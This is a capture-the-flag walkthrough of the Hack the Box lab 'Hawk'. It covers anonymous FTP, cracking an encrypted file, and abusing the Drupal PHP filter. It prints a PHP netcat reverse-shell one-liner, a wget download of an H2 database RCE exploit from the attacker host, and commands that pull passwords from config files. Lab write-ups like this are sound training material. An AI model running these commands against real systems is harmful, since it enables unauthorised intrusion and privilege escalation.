									Today we are going to solve another CTF challenge “Hawk”. Hawk is a retired vulnerable lab presented by Hack the Box for helping pentester’s to perform online penetration testing according to your experience level; they have a collection of vulnerable labs as challenges, from beginners to Expert level.
Level: Easy
Task: To find user.txt and root.txt
Note: Since these labs are online available therefore they have static IP. The IP of Hawk is 10.10.10.102
Penetration Methodology:

Port scanning and IP discovery
Anonymous FTP Login
Checking file type
Getting Login Credentials
Browsing IP through port 80
Exploiting Drupal
Reading First Flag User.txt
Getting Login Credentials
Spawning TTY Shell
Searching exploit via Searchsploit
Getting root Access
Reading Final Flag Root.txt

Walkthrough
Let’s start off with our basic nmap command to find out the open ports and running services.

		
		
			
			
			
			
nmap -A 10.10.10.102
			
				
					
				
					1
				
						nmap -A 10.10.10.102
					
				
			
		


The Nmap output shows various open ports: 21(ftp), 22(ssh), 80 http server (Drupal CMS), 8082 (h2 database http console).
From the NMAP Scan output, we saw that ftp Port 21 is Open and the next thing that catches our eyes is that it has Anonymous login allowed.

		
		
			
			
			
			
ftp 10.10.10.102
			
				
					
				
					1
				
						ftp 10.10.10.102
					
				
			
		

We easily connected to ftp through Anonymous Login. Moving on, after navigating through multiple directories we found a hidden file i.e. “.drupal.txt.enc “and then we transferred the file to our local machine.

Since .drupa.txt.enc is encrypted. Let’s check the file type using the ‘file’ command.

		
		
			
			
			
			
file .drupal.txt.enc
			
				
					
				
					1
				
						file .drupal.txt.enc
					
				
			
		


It came out to be OpenSSL encoded data with a salted password. Clearly, we need to decrypt the file to get any further clue.
To crack this file, we have used an OpenSSL bruteforce tool which is easily available on GitHub. You can download it from the given below link or can run the following command for downloading and script execution.

		
		
			
			
			
			
git clone https://github.com/deltaclock/go-openssl-bruteforce.git
./openssl-brute --file /root/.drupal.txt.enc
			
				
					
				
					12
				
						git clone https://github.com/deltaclock/go-openssl-bruteforce.git./openssl-brute --file /root/.drupal.txt.enc
					
				
			
		

Boom!! We have successfully cracked the file and the Password Hint we got is “PencilKeyboardScanner123” this could be the password for CMS Login. Let’s Check it.

As port 80 is running http server, we open the target machine’s IP address in our browser and found out it’s a Drupal Login Page. To Login this page we have used a Basic Username: admin and Password: PencilKeyboardScanner123.

Oh yeah!! We have successfully logged into the admin dashboard. Now go to modules and then enable the checkbox for Path and PHP filter.

After that go to Content &gt; Add Content &gt; Basic Page to create a basic page where we can write malicious code to spawn the web shell. Just give any title for your malicious code.
Here we have written one-liner code for PHP reverse shell with the help of Pentest Monkey website.

		
		
			
			
			
			
&lt;?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.10 1234 &gt;/tmp/f"); ?&gt;
			
				
					
				
					1
				
						&lt;?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.10 1234 &gt;/tmp/f"); ?&gt;
					
				
			
		

Then select the Text format as “PHP code”. Before saving it you should start netcat listener on the listening port. So, once the code is executed it will establish a reverse connection.

		
		
			
			
			
			
nc -lvp 1234
			
				
					
				
					1
				
						nc -lvp 1234
					
				
			
		

 
We got a reverse connection of the victim’s machine on our netcat listener. To spawn the proper shell we have used python3 bin bash shell.

		
		
			
			
			
			
 python3 -c 'import pty;pty.spawn("/bin/bash")'
			
				
					
				
					1
				
						 python3 -c 'import pty;pty.spawn("/bin/bash")'
					
				
			
		

Inside /home/denial we have got to User.txt flag, now time to find the root flag. While exploring through directories, we thought of reading the contents of the “settings.php” file, in this file we found the password: drupal4hawk

		
		
			
			
			
			
cat settings.php | grep password
			
				
					
				
					1
				
						cat settings.php | grep password
					
				
			
		

 
Then with the following command, we switch the user and logged in as user daniel.

		
		
			
			
			
			
su daniel
Password: drupal4hawk
			
				
					
				
					12
				
						su danielPassword: drupal4hawk
					
				
			
		

Here we have used Simple phyton3 commands to escape the python3 interpreter.

		
		
			
			
			
			
&gt;&gt;import pty
&gt;&gt;pty.spawn('/bin/bash')
			
				
					
				
					12
				
						&gt;&gt;import pty&gt;&gt;pty.spawn('/bin/bash')
					
				
			
		


From Nmap scan output we notice that “H2 database running on port 8082”, therefore we search out for H2 database exploit in searchsploit.

		
		
			
			
			
			
searchsploit H2 database
			
				
					
				
					1
				
						searchsploit H2 database
					
				
			
		

It came out to be a Remote Code Execution. The exploit we have used is highlighted, after that, we have copied the exploit 45506.py in the /root directory and run a Python server to download the file in the target machine.

		
		
			
			
			
			
searchsploit -m 45506
python -m SimpleHTTPServer 8080
			
				
					
				
					12
				
						searchsploit -m 45506python -m SimpleHTTPServer 8080
					
				
			
		


Afterward, we have downloaded our exploit 45506.py in the /tmp directory of the target machine. Then Grant the FULL permission to the exploit and execute it using the command.

		
		
			
			
			
			
cd /tmp
wget http://10.10.14.10:8080/45506.py
chmod 777 45506.py
python3 45506.py –H 127.0.0.1:8082
id
			
				
					
				
					12345
				
						cd /tmpwget http://10.10.14.10:8080/45506.pychmod 777 45506.pypython3 45506.py –H 127.0.0.1:8082id
					
				
			
		

Finally!! We have got the root access. Now let’s go and get the “root.txt”. We take a look at the content of the file and found our final flag.
